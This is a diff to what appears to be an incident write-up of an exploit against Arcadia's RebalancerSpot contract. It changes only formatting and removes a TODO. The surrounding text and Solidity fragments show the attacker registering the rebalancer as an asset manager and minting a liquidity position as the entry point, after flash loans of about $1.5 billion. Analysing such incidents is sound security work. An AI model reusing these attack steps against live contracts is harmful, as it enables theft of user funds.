@@ -92,7 +92,6 @@ The attacker obtained approximately $1.5 billion through three sequential Morpho
 
 Using one of his previously created accounts, the attacker linked the `RebalancerSpot` contract as an Asset Manager, designating himself as the `initiator` to gain control over rebalancing operations.
 
-//TODO: Explain the exploit hook
 ```solidity
 IAccount(accounts[0]).setAssetManager(rebalancerSpot, true);
 
@@ -103,7 +102,7 @@ IRebalancerSpot(rebalancerSpot).setAccountInfo(
 );
 ```
 
-The attacker created a liquidity position and deposited it into the attacker's Arcadia account along with additional USDC and cbBTC tokens. This position served as the entry point for the malicious rebalancing operation.
+The attacker created a liquidity position and deposited it into the attacker's Arcadia account along with additional `USDC` and `cbBTC` tokens. This position served as the entry point for the malicious rebalancing operation.
 
 ```solidity
 (uint256 tokenId,_,_,_) = nonFungiblePositionManagerAERO_CL_POS.mint(mintParams);
